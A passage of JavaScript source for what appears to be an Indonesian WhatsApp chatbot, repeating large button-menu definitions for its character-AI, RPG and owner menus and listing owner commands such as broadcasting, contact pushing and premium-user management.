      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'caibutton': {
let teks = `◤─「 \`CHAR AI\` 」─✦
│⦿ 〔 _.hutao-cai_
│⦿ 〔 _.kurumi-cai_
│⦿ 〔 _.elaina-cai_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'rpgmenubutton': {
let teks =`◤─「 \`RPG MENU\` 」─✦
COMMING SOON
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}
break
case 'ownermenubutton': {
let teks =`◤─「 \`OWNER MENU\` 」─✦
│⦿ 〔 _.autoread_
│⦿ 〔 _.upchv2_
│⦿ 〔 _.addsewa_
│⦿ 〔 _.delwa_
│⦿ 〔 _.onlypc_
│⦿ 〔 _.onlygc_
│⦿ 〔 _.self_
│⦿ 〔 _.clearchat_
│⦿ 〔 _.pinchat_
│⦿ 〔 _.unpinchat_
│⦿ 〔 _.gconly_ 
│⦿ 〔 _.public_ 
│⦿ 〔 _.setpppanjang_ 
│⦿ 〔 _.setppgcpanjang_ 
│⦿ 〔 _.addcase_
│⦿ 〔 _.join_ 
│⦿ 〔 _.bctext_ 
│⦿ 〔 _.poll_ 
│⦿ 〔 _.bcimage_
│⦿ 〔 _.bcvideo_
│⦿ 〔 _.creategc_
│⦿ 〔 _.setexif_
│⦿ 〔 _.userjid_
│⦿ 〔 _.setbotname_
│⦿ 〔 _.setbotbio_
│⦿ 〔 _.delppbot_
│⦿ 〔 _.restart_
│⦿ 〔 _.setppbot_
│⦿ 〔 _.addprem_
│⦿ 〔 _.delprem_
│⦿ 〔 _.addowner_
│⦿ 〔 _.delowner_
│⦿ 〔 _.addvn_
│⦿ 〔 _.delvn_
│⦿ 〔 _.addsticker_
│⦿ 〔 _.delsticker_
│⦿ 〔 _.addimage_
│⦿ 〔 _.delimage_
│⦿ 〔 _.addvideo_
│⦿ 〔 _.delvideo_
│⦿ 〔 _.block_
│⦿ 〔 _.unblock del_
│⦿ 〔 _.leavegc_
│⦿ 〔 _.pushkontak_
│⦿ 〔 _.pushkontakv2_
│⦿ 〔 _.pushkontakv3_
│⦿ 〔 _.pushkontakv4_
│⦿ 〔 _.savekontakv_
│⦿ 〔 _.savekontakv2_
│⦿ 〔 _.getkontak_
│⦿ 〔 _.sendkontak_
│⦿ 〔 _.jpm_
